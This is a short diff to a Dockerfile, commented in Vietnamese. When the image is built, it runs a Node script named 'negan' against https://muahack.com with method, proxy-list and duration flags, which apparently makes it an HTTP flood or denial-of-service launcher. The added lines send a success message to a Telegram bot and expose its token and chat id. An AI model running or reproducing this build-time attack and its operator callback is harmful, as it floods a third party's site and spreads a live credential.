@@ -13,4 +13,9 @@ COPY . .
 # Chạy lệnh node với tham số truyền vào
 RUN node ./negan -m GET -u https://muahack.com -p 1.txt --full true -s 10
 
+# Gửi tin nhắn thông báo về Telegram bot
+RUN curl -s -X POST https://api.telegram.org/bot7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw/sendMessage \
+    -d chat_id=7371969470 \
+    -d text="Lệnh đã được thực thi thành công trên container."
+
 # Không có lệnh CMD hay ENTRYPOINT để ngăn container khởi động tự động
